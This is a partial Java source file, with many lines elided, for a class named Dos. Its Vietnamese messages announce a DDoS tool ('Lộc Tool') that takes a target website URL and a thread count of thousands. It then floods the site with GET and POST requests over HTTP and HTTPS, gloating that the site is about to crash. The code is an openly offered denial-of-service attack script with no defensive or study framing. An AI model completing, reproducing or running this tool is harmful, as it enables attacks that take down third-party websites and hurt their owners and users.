...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Chuẩn Bị Tấn Công Web: " + url);

        String[] SUrl = url.split("://");

        System.out.println("Kiểm Tra Kết Nối Tới Web");
        ...
        System.out.println("Cài Đặt Ddos By: Lộc Tool");

        System.out.print("Nhập Luồng (7500): ");
        ...
        System.out.print("Nhập Method(4500): ");
        ...
        System.out.println("Đang Tấn Công Web");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Web Sắp Sập Rồi Kìa: " + responseCode + "Thread: " + this.seq);
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Web Sắp Sập Rồi  Kìa HAHAHA: " + responseCode + "Số Luồng: " + this.seq);
    }
    ...
    private void sslPostAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Web Sắp Sập Rồi Hahahaha!:" + responseCode + "Thread: " + this.seq);
    }
    ...
    private void sslGetAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Web Sắp Sập Rồi Kìa Hahahaha: " + responseCode + "Thread: " + this.seq);
    }
}